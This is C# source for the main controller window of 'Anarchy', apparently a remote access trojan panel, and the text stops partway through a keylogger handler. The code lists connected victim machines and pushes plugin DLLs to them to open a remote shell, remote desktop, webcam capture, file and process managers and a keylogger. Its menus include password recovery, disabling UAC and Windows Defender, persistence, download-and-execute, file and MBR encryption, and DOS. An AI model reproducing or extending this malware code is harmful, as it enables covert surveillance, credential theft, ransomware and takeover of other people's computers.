using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Anarchy.Auth;
using Anarchy.Handlers;
using Anarchy.Helpers.Algorithm;
using Anarchy.Helpers.Helper;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;
using cGeoIp;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Siticone.UI.WinForms;
using ListViewColumnSorter = Anarchy.Helpers.ListViewColumnSorter;
using Settings = Anarchy.Helpers.Settings;

namespace Anarchy.Forms;

public class Form1 : Form
{
    public static class ClipboardHelper
    {
        public static void SetClipboardText(string text)
        {
            try
            {
                Clipboard.SetText(text);
            }
            catch (Exception)
            {
            }
        }
    }

    private bool trans;

    public cGeoMain cGeoMain = new cGeoMain();

    private List<AsyncTask> getTasks = new List<AsyncTask>();

    private ListViewColumnSorter lvwColumnSorter;

    private readonly FormDOS formDOS;

    private IContainer components;

    private StatusStrip statusStrip1;

    private ToolStripStatusLabel toolStripStatusLabel1;

    private System.Windows.Forms.Timer ping;

    private System.Windows.Forms.Timer UpdateUI;

    private PerformanceCounter performanceCounter1;

    private PerformanceCounter performanceCounter2;

    public ImageList ThumbnailImageList;

    public NotifyIcon notifyIcon1;

    private System.Windows.Forms.Timer TimerTask;

    private ToolStripStatusLabel toolStripStatusLabel2;

    private TabControl tabControl1;

    private TabPage tabPage1;

    private TabPage tabPage3;

    private TabPage tabPage4;

    public ListView listView4;

    private ColumnHeader columnHeader4;

    private ColumnHeader columnHeader5;

    private Guna2Panel guna2Panel1;

    private Guna2Panel guna2Panel2;

    private SiticoneControlBox siticoneControlBox2;

    private SiticoneControlBox siticoneControlBox1;

    private Guna2DragControl guna2DragControl1;

    private Guna2DragControl guna2DragControl2;

    private SiticoneControlBox siticoneControlBox3;

    private SiticoneControlBox siticoneControlBox4;

    public ListView listView1;

    private ColumnHeader lv_ip;

    private ColumnHeader lv_country;

    private ColumnHeader lv_group;

    public ColumnHeader lv_hwid;

    private ColumnHeader lv_user;

    private ColumnHeader lv_os;

    private ColumnHeader lv_ins;

    private ColumnHeader lv_admin;

    private ColumnHeader lv_av;

    private Guna2Panel guna2Panel3;

    internal Guna2GradientPanel Guna2GradientPanel3;

    internal Guna2GradientPanel Guna2GradientPanel1;

    internal Guna2GradientPanel Guna2GradientPanel2;

    internal Guna2GradientPanel guna2GradientPanel4;

    public ListView listView2;

    private ColumnHeader Logs;

    private ColumnHeader columnHeader2;

    private Label label11;

    private Label label9;

    private Label label1;

    private Label label10;

    private Label label7;

    private Label label2;

    private Label label8;

    private Label label4;

    private Label label3;

    private Label label12;

    private Label label13;

    private Label label16;

    private Label label17;

    private Label label5;

    private Label label14;

    private Label label18;

    private Label label19;

    private Label label20;

    public ImageList zzimageList1;

    private Guna2Panel Pnlinfo;

    private Guna2Button guna2Button2;

    private Guna2Button guna2Button1;

    private Guna2Elipse guna2Elipse4;

    private Guna2Button guna2Button3;

    public ListView listView3;

    private Guna2Panel guna2Panel4;

    private Guna2TextBox textBox1;

    private Label label6;

    private ImageList imgFlags;

    private Guna2Button guna2Button7;

    private Guna2Button guna2Button6;

    private Guna2Button guna2Button4;

    private Guna2Button btnHide;

    private Guna2Button btnShow;

    private Guna2Button guna2Button8;

    private Guna2Button guna2Button5;

    private Guna2Button guna2Button9;

    private PictureBox pictureBox1;

    private PictureBox pictureBox8;

    private PictureBox pictureBox7;

    private PictureBox pictureBox2;

    private PictureBox pictureBox6;

    private PictureBox pictureBox3;

    private PictureBox pictureBox9;

    private PictureBox pictureBox5;

    private PictureBox pictureBox11;

    private PictureBox pictureBox12;

    private PictureBox pictureBox10;

    private ToolStripMenuItem cLEARToolStripMenuItem;

    private Guna2ContextMenuStrip contextMenuStrip;

    private ToolStripMenuItem remoteDesktopToolStripMenuItem;

    private ToolStripMenuItem sToolStripMenuItem;

    private ToolStripMenuItem EncryptToolStripMenuItem;

    private ToolStripMenuItem DecryptToolStripMenuItem;

    private ToolStripMenuItem RemoteShellToolStripMenuItem;

    private ToolStripMenuItem FileManagerToolStripMenuItem1;

    private ToolStripMenuItem SendFileToolStripMenuItem1;

    private ToolStripMenuItem fromUrlToolStripMenuItem;

    private ToolStripMenuItem SendFileToDiskToolStripMenuItem;

    private ToolStripMenuItem SendFileToMemoryToolStripMenuItem;

    private ToolStripMenuItem toolStripMenuItem17;

    private ToolStripMenuItem SilentCleanupToolStripMenuItem;

    private ToolStripMenuItem RunasToolStripMenuItem;

    private ToolStripMenuItem toolStripMenuItem20;

    private ToolStripMenuItem DisableUACToolStripMenuItem;

    private ToolStripMenuItem disableWDToolStripMenuItem;

    private ToolStripMenuItem ChatToolStripMenuItem1;

    private ToolStripMenuItem toolStripMenuItem57;

    private ToolStripMenuItem ClientControlToolStripMenuItem;

    private ToolStripMenuItem StopToolStripMenuItem1;

    private ToolStripMenuItem UpdateToolStripMenuItem;

    private ToolStripMenuItem restartToolStripMenuItem;

    private ToolStripMenuItem UninstallToolStripMenuItem;

    private ToolStripMenuItem ClientFolderToolStripMenuItem;

    private PictureBox pictureBox4;

    private Guna2ContextMenuStrip contextMenuThumbnail;

    private ToolStripMenuItem sTARTToolStripMenuItem;

    private ToolStripMenuItem sTOPToolStripMenuItem;

    private Guna2ContextMenuStrip contextMenuLogs;

    private ToolStripMenuItem toolStripMenuItem27;

    private ToolStripMenuItem passwordRecoveryToolStripMenuItem;

    private ToolStripMenuItem processManagerToolStripMenuItem;

    private Guna2Elipse guna2Elipse1;

    private ToolStripMenuItem keyloggerToolStripMenuItem;

    private ToolStripMenuItem fodhelperToolStripMenuItem;

    private ToolStripMenuItem toolStripMenuItem40;

    private ToolStripMenuItem toolStripMenuItem41;

    private ToolStripMenuItem toolStripMenuItem42;

    private ToolStripMenuItem toolStripMenuItem43;

    private Guna2TabControl guna2TabControl1;

    private TabPage Tasks;

    private TabPage Desktops;

    public ListView listView8;

    private Guna2Elipse guna2Elipse2;

    private ToolStripMenuItem copyToolStripMenuItem;

    private Guna2ContextMenuStrip guna2ContextMenuStrip2;

    private ToolStripMenuItem dELETETASKToolStripMenuItem;

    private ToolStripMenuItem downloadAndExecuteToolStripMenuItem;

    private ToolStripMenuItem updateAllClientsToolStripMenuItem;

    private ToolStripMenuItem downloadExecuteToolStripMenuItem;

    private ToolStripMenuItem persistenceDefeatUACToolStripMenuItem;

    private ToolStripMenuItem persistenceDefeatWDToolStripMenuItem;

    private ImageList imageList1;

    private Guna2VScrollBar guna2VScrollBar2;

    private ToolStripMenuItem startupTaskToolStripMenuItem;

    private ToolStripMenuItem toolStripMenuItem50;

    private ToolStripMenuItem toolStripMenuItem51;

    private ToolStripMenuItem addSheduleTaskToolStripMenuItem;

    private ToolStripMenuItem toolStripMenuItem52;

    private ToolStripMenuItem addToStartupToolStripMenuItem;

    private ToolStripMenuItem toolStripMenuItem53;

    private ToolStripMenuItem mergeregToolStripMenuItem;

    private ToolStripMenuItem executeVBSToolStripMenuItem;

    private ToolStripMenuItem toolStripMenuItem2;

    private ToolStripMenuItem sToolStripMenuItem1;

    private ToolStripMenuItem settingsToolStripMenuItem;

    private Guna2Elipse guna2Elipse3;

    private Guna2TabControl guna2TabControl2;

    private TabPage tabPage5;

    private Guna2Elipse guna2Elipse5;

    private ToolStripMenuItem mBRSettingsToolStripMenuItem;
    internal Guna2CircleProgressBar Guna2CircleProgressBar2;
    private ToolStripMenuItem mBREncryptToolStripMenuItem;

    public Form1()
    {
        this.InitializeComponent();
        this.listView1.Columns[0].TextAlign = HorizontalAlignment.Center;
        this.listView1.Columns[1].TextAlign = HorizontalAlignment.Center;
        this.listView1.Columns[2].TextAlign = HorizontalAlignment.Center;
        this.listView1.Columns[3].TextAlign = HorizontalAlignment.Center;
        this.listView1.Columns[4].TextAlign = HorizontalAlignment.Center;
        this.listView1.Columns[5].TextAlign = HorizontalAlignment.Center;
        this.listView1.Columns[6].TextAlign = HorizontalAlignment.Center;
        this.listView1.Columns[7].TextAlign = HorizontalAlignment.Center;
        this.listView1.Columns[8].TextAlign = HorizontalAlignment.Center;
        this.listView1.View = View.Details;
        this.listView1.HideSelection = false;
        this.listView1.OwnerDraw = true;
        this.listView1.GridLines = false;
        this.listView1.BackColor = Color.FromArgb(30, 32, 37);
        this.listView1.DrawColumnHeader += delegate(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            SolidBrush brush;
            brush = new SolidBrush(Color.FromArgb(34, 39, 49));
            e.Graphics.FillRectangle(brush, e.Bounds);
            TextRenderer.DrawText(e.Graphics, e.Header.Text, e.Font, e.Bounds, Color.WhiteSmoke);
        };
        this.listView1.DrawItem += delegate(object sender, DrawListViewItemEventArgs e)
        {
            e.DrawDefault = true;
        };
        this.listView1.DrawSubItem += delegate(object sender, DrawListViewSubItemEventArgs e)
        {
            e.DrawDefault = true;
        };
        base.Opacity = 0.0;
        Form1.colorListViewHeader(ref this.listView2, this.listView2.BackColor, this.listView2.ForeColor);
        Form1.colorListViewHeader(ref this.listView4, this.listView4.BackColor, this.listView4.ForeColor);
        this.formDOS = new FormDOS
        {
            Name = "DOS",
            Text = "DOS"
        };
        this.listView1.SmallImageList = this.zzimageList1;
        this.listView1.LargeImageList = this.zzimageList1;
        this.zzimageList1.Images.SetKeyName(0, "--.png");
    }

    public static void colorListViewHeader(ref ListView list, Color backColor, Color foreColor)
    {
        list.OwnerDraw = true;
        list.DrawColumnHeader += delegate(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            Form1.headerDraw(sender, e, backColor, foreColor);
        };
        list.DrawItem += bodyDraw;
    }

    private static void headerDraw(object sender, DrawListViewColumnHeaderEventArgs e, Color backColor, Color foreColor)
    {
        e.Graphics.FillRectangle(new SolidBrush(backColor), e.Bounds);
        e.Graphics.DrawString(e.Header.Text, e.Font, new SolidBrush(foreColor), e.Bounds);
    }

    private static void bodyDraw(object sender, DrawListViewItemEventArgs e)
    {
        e.DrawDefault = true;
    }

    private void CheckFiles()
    {
        try
        {
            if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + ".config")))
            {
                MessageBox.Show("Missing " + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + ".config");
                Environment.Exit(0);
            }
            if (!File.Exists(Path.Combine(Application.StartupPath, "Stub\\Stub.exe")) && !Directory.Exists(Path.Combine(Application.StartupPath, "Stub")))
            {
                Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Stub"));
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message, "Anarchy", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
    }

    private Clients[] GetSelectedClients()
    {
        List<Clients> clientsList;
        clientsList = new List<Clients>();
        base.Invoke((MethodInvoker)delegate
        {
            lock (Settings.LockListviewClients)
            {
                if (this.listView1.SelectedItems.Count != 0)
                {
                    foreach (ListViewItem selectedItem in this.listView1.SelectedItems)
                    {
                        clientsList.Add((Clients)selectedItem.Tag);
                    }
                    return;
                }
            }
        });
        return clientsList.ToArray();
    }

    private Clients[] GetAllClients()
    {
        List<Clients> clientsList;
        clientsList = new List<Clients>();
        base.Invoke((MethodInvoker)delegate
        {
            lock (Settings.LockListviewClients)
            {
                if (this.listView1.Items.Count != 0)
                {
                    foreach (ListViewItem item in this.listView1.Items)
                    {
                        clientsList.Add((Clients)item.Tag);
                    }
                    return;
                }
            }
        });
        return clientsList.ToArray();
    }

    private async void Connect()
    {
        try
        {
            await Task.Delay(1000);
            string[] ports = Properties.Settings.Default.Ports.Split(',');
            foreach (var port in ports)
            {
                if (!string.IsNullOrWhiteSpace(port))
                {
                    Listener listener = new Listener();
                    Thread thread = new Thread(new ParameterizedThreadStart(listener.Connect));
                    thread.IsBackground = true;
                    thread.Start(Convert.ToInt32(port.ToString().Trim()));
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
            Environment.Exit(0);
        }
        /*
        try
        {
            await Task.Delay(1000);
            string[] array;
            array = Anarchy.Properties.Settings.Default.Ports.Split(',');
            foreach (string text in array)
            {
                if (!string.IsNullOrWhiteSpace(text))
                {
                    Thread thread;
                    thread = new Thread(new Listener().Connect);
                    thread.IsBackground = true;
                    thread.Start(Convert.ToInt32(text.ToString().Trim()));
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
            Environment.Exit(0);
        }
        */
    }

    private async void Form1_Load(object sender, EventArgs e)
    {
        this.Pnlinfo.Visible = false;
        ListviewDoubleBuffer.Enable(this.listView1);
        ListviewDoubleBuffer.Enable(this.listView2);
        ListviewDoubleBuffer.Enable(this.listView3);
        try
        {
            string[] array;
            array = Properties.Settings.Default.txtBlocked.Split(',');
            foreach (string text in array)
            {
                if (!string.IsNullOrWhiteSpace(text))
                {
                    Settings.Blocked.Add(text);
                }
            }
        }
        catch
        {
        }
        this.CheckFiles();
        this.lvwColumnSorter = new ListViewColumnSorter();
        this.listView1.ListViewItemSorter = this.lvwColumnSorter;
        this.Text = Settings.Version ?? "";
        using (FormPorts formPorts = new FormPorts())
        {
            formPorts.ShowDialog();
        }
        await Methods.FadeIn(this, 5);
        this.trans = true;
        if (Properties.Settings.Default.Notification)
        {
            this.toolStripStatusLabel2.ForeColor = Color.Green;
        }
        else
        {
            this.toolStripStatusLabel2.ForeColor = Color.Green;
        }
        new Thread((ThreadStart)delegate
        {
            this.Connect();
        }).Start();
    }

    private void Form1_Activated(object sender, EventArgs e)
    {
        if (this.trans)
        {
            base.Opacity = 1.0;
        }
    }

    private void Form1_Deactivate(object sender, EventArgs e)
    {
        base.Opacity = 0.95;
    }

    private void Form1_FormClosed(object sender, FormClosedEventArgs e)
    {
        this.notifyIcon1.Dispose();
        Environment.Exit(0);
    }

    private void listView1_KeyDown(object sender, KeyEventArgs e)
    {
        if (this.listView1.Items.Count <= 0 || e.Modifiers != Keys.Control || e.KeyCode != Keys.A)
        {
            return;
        }
        foreach (ListViewItem item in this.listView1.Items)
        {
            item.Selected = true;
        }
    }

    private void listView1_MouseMove(object sender, MouseEventArgs e)
    {
        if (this.listView1.Items.Count > 1)
        {
            ListViewHitTestInfo listViewHitTestInfo;
            listViewHitTestInfo = this.listView1.HitTest(e.Location);
            if (e.Button == MouseButtons.Left && (listViewHitTestInfo.Item != null || listViewHitTestInfo.SubItem != null))
            {
                this.listView1.Items[listViewHitTestInfo.Item.Index].Selected = true;
            }
        }
    }

    private void ListView1_ColumnClick(object sender, ColumnClickEventArgs e)
    {
        if (e.Column == this.lvwColumnSorter.SortColumn)
        {
            if (this.lvwColumnSorter.Order == SortOrder.Ascending)
            {
                this.lvwColumnSorter.Order = SortOrder.Descending;
            }
            else
            {
                this.lvwColumnSorter.Order = SortOrder.Ascending;
            }
        }
        else
        {
            this.lvwColumnSorter.SortColumn = e.Column;
            this.lvwColumnSorter.Order = SortOrder.Ascending;
        }
        this.listView1.Sort();
    }

    private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
    {
        if (Properties.Settings.Default.Notification)
        {
            Properties.Settings.Default.Notification = false;
            this.toolStripStatusLabel2.ForeColor = Color.Black;
        }
        else
        {
            Properties.Settings.Default.Notification = true;
            this.toolStripStatusLabel2.ForeColor = Color.Green;
        }
        Properties.Settings.Default.Save();
    }

    private void ping_Tick(object sender, EventArgs e)
    {
        if (this.listView1.Items.Count > 0)
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "Ping";
            msgPack.ForcePathObject("Message").AsString = "This is a ping!";
            Clients[] allClients;
            allClients = this.GetAllClients();
            for (int i = 0; i < allClients.Length; i++)
            {
                ThreadPool.QueueUserWorkItem(allClients[i].Send, msgPack.Encode2Bytes());
            }
            GC.Collect();
        }
    }

    private void UpdateUI_Tick(object sender, EventArgs e)
    {
        this.Text = Settings.Version + "     " + DateTime.Now.ToLongTimeString();
        lock (Settings.LockListviewClients)
        {
            this.toolStripStatusLabel1.Text = "Online " + this.listView1.Items.Count + "     Selected " + this.listView1.SelectedItems.Count;
        }
        this.label19.Text = this.listView1.Items.Count.ToString() ?? "";
        this.label17.Text = this.listView1.SelectedItems.Count.ToString() ?? "";
        this.label5.Text = $"{(int)this.performanceCounter1.NextValue()}%";
        this.label13.Text = $"{(int)this.performanceCounter2.NextValue()}%";
        this.label9.Text = Methods.BytesToString(Settings.ReceivedValue).ToString() ?? "";
    }

    private void CLEARToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            lock (Settings.LockListviewLogs)
            {
                this.listView2.Items.Clear();
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void STARTToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (this.listView1.Items.Count > 0)
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "thumbnails";
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] allClients;
            allClients = this.GetAllClients();
            for (int i = 0; i < allClients.Length; i++)
            {
                ThreadPool.QueueUserWorkItem(allClients[i].Send, msgPack2.Encode2Bytes());
            }
        }
    }

    private void STOPToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (this.listView1.Items.Count > 0)
            {
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "thumbnailsStop";
                foreach (ListViewItem item in this.listView3.Items)
                {
                    ThreadPool.QueueUserWorkItem(((Clients)item.Tag).Send, msgPack.Encode2Bytes());
                }
            }
            this.listView3.Items.Clear();
            this.ThumbnailImageList.Images.Clear();
            foreach (ListViewItem item2 in this.listView1.Items)
            {
                ((Clients)item2.Tag).LV2 = null;
            }
        }
        catch
        {
        }
    }

    private void DELETETASKToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (this.listView4.SelectedItems.Count <= 0)
        {
            return;
        }
        foreach (ListViewItem selectedItem in this.listView4.SelectedItems)
        {
            selectedItem.Remove();
        }
    }

    private async void TimerTask_Tick(object sender, EventArgs e)
    {
        try
        {
            Clients[] clients;
            clients = this.GetAllClients();
            if (this.getTasks.Count <= 0 || clients.Length == 0)
            {
                return;
            }
            foreach (AsyncTask item in this.getTasks.ToList())
            {
                if (this.GetListview(item.id))
                {
                    Clients[] array;
                    array = clients;
                    foreach (Clients clients2 in array)
                    {
                        if (!item.doneClient.Contains(clients2.ID))
                        {
                            item.doneClient.Add(clients2.ID);
                            this.SetExecution(item.id);
                            ThreadPool.QueueUserWorkItem(clients2.Send, item.msgPack);
                        }
                    }
                    await Task.Delay(15000);
                    continue;
                }
                this.getTasks.Remove(item);
                return;
            }
        }
        catch
        {
        }
    }

    private bool GetListview(string id)
    {
        foreach (ListViewItem item in Login.form1.listView4.Items)
        {
            if (item.ToolTipText == id)
            {
                return true;
            }
        }
        return false;
    }

    private void SetExecution(string id)
    {
        foreach (ListViewItem item in Login.form1.listView4.Items)
        {
            if (item.ToolTipText == id)
            {
                int num;
                num = Convert.ToInt32(item.SubItems[1].Text) + 1;
                item.SubItems[1].Text = num.ToString();
            }
        }
    }

    [DllImport("uxtheme", CharSet = CharSet.Unicode)]
    public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);

    private void builderToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        using FormBuilder formBuilder = new FormBuilder();
        formBuilder.ShowDialog();
    }

    private void aboutToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        using FormAbout formAbout = new FormAbout();
        formAbout.ShowDialog();
    }

    private void RemoteShellToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "shell";
            MsgPack msgPack2;
            msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\0guo3zbo66fqoG.dll");
            msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                if ((FormShell)Application.OpenForms["shell:" + clients.ID] == null)
                {
                    FormShell formShell;
                    formShell = new FormShell();
                    formShell.Name = "shell:" + clients.ID;
                    formShell.Text = "shell:" + clients.ID;
                    formShell.F = this;
                    formShell.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void RemoteScreenToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RssCnLKcGRxj.dll");
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                if ((FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + clients.ID] == null)
                {
                    FormRemoteDesktop formRemoteDesktop;
                    formRemoteDesktop = new FormRemoteDesktop();
                    formRemoteDesktop.Name = "RemoteDesktop:" + clients.ID;
                    formRemoteDesktop.F = this;
                    formRemoteDesktop.Text = "RemoteDesktop:" + clients.ID;
                    formRemoteDesktop.ParentClient = clients;
                    formRemoteDesktop.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "RemoteDesktop");
                    formRemoteDesktop.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void RemoteCameraToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            if (this.listView1.SelectedItems.Count <= 0)
            {
                return;
            }
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteCamera.dll");
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                if ((FormWebcam)Application.OpenForms["Webcam:" + clients.ID] == null)
                {
                    FormWebcam formWebcam;
                    formWebcam = new FormWebcam();
                    formWebcam.Name = "Webcam:" + clients.ID;
                    formWebcam.F = this;
                    formWebcam.Text = "Webcam:" + clients.ID;
                    formWebcam.ParentClient = clients;
                    formWebcam.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "Camera");
                    formWebcam.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\zVvPGvK64uLS.dll");
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                if ((FormFileManager)Application.OpenForms["fileManager:" + clients.ID] == null)
                {
                    FormFileManager formFileManager;
                    formFileManager = new FormFileManager();
                    formFileManager.Name = "fileManager:" + clients.ID;
                    formFileManager.Text = "fileManager:" + clients.ID;
                    formFileManager.F = this;
                    formFileManager.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID);
                    formFileManager.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void ProcessManagerToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\sJ88z8tsg5XzK.dll");
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                if ((FormProcessManager)Application.OpenForms["processManager:" + clients.ID] == null)
                {
                    FormProcessManager formProcessManager;
                    formProcessManager = new FormProcessManager();
                    formProcessManager.Name = "processManager:" + clients.ID;
                    formProcessManager.Text = "processManager:" + clients.ID;
                    formProcessManager.F = this;
                    formProcessManager.ParentClient = clients;
                    formProcessManager.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private async void SendFileToDiskToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void SendFileToMemoryToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void MessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
    {
        try
        {
            string text;
            text = Interaction.InputBox("Message", "Message", "123123");
            if (!string.IsNullOrEmpty(text))
            {
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "sendMessage";
                msgPack.ForcePathObject("Message").AsString = text;
                MsgPack msgPack2;
                msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\yL9x34D8X3oO2P.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients;
                selectedClients = this.GetSelectedClients();
                for (int i = 0; i < selectedClients.Length; i++)
                {
                    ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void ChatToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        try
        {
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                if ((FormChat)Application.OpenForms["chat:" + clients.ID] == null)
                {
                    FormChat formChat;
                    formChat = new FormChat();
                    formChat.Name = "chat:" + clients.ID;
                    formChat.Text = "chat:" + clients.ID;
                    formChat.F = this;
                    formChat.ParentClient = clients;
                    formChat.Show();
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void VisteWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        try
        {
            string text;
            text = Interaction.InputBox("Visit website", "URL", "https://www.baidu.com");
            if (!string.IsNullOrEmpty(text))
            {
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "visitURL";
                msgPack.ForcePathObject("URL").AsString = text;
                MsgPack msgPack2;
                msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\yL9x34D8X3oO2P.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients;
                selectedClients = this.GetSelectedClients();
                for (int i = 0; i < selectedClients.Length; i++)
                {
                    ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void ChangeWallpaperToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        try
        {
            if (this.listView1.SelectedItems.Count <= 0)
            {
                return;
            }
            using OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "All Graphics Types|*.bmp;*.jpg;*.jpeg;*.png";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "wallpaper";
                msgPack.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
                msgPack.ForcePathObject("Exe").AsString = Path.GetExtension(openFileDialog.FileName);
                MsgPack msgPack2;
                msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\yL9x34D8X3oO2P.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients;
                selectedClients = this.GetSelectedClients();
                for (int i = 0; i < selectedClients.Length; i++)
                {
                    ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\mML6WKMqdxjDGA.dll");
            Clients[] selectedClients;
            selectedClients = this.GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                if ((FormKeylogger)Application.OpenForms["keyLogger:" + clients.ID] == null)
                {
                    FormKeylogger formKeylogger;
                    formKeylogger = new FormKeylogger();
                    formKeylogger.Name = "keyLogger:" + clients.ID;
